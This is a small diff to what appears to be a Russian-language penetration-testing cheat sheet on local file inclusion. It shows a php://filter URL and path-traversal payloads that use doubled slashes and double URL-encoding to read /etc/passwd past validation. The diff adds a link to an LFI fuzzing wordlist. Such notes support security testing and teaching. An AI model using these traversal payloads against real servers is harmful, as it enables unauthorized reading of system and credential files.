@@ -114,3 +114,6 @@ http://target.com/playground.php?page=php://filter/convert.base64-decode/resourc
 /var/www/html/..//..//..//etc/passwd   <!-- двойные слэши могут игнорироваться валидацией, а отрабатывать как один слэш -->
 
 /var/www/html%252F%252E%252E%252F%252F%252E%252E%252F%252F%252E%252E%252F%252Fetc%252Fpasswd   <!-- URL-энкодинг двойных слэшей и точек, можно сделать двойной энкодинг -->
+
+LFI СЛОВАРЬ:
+https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
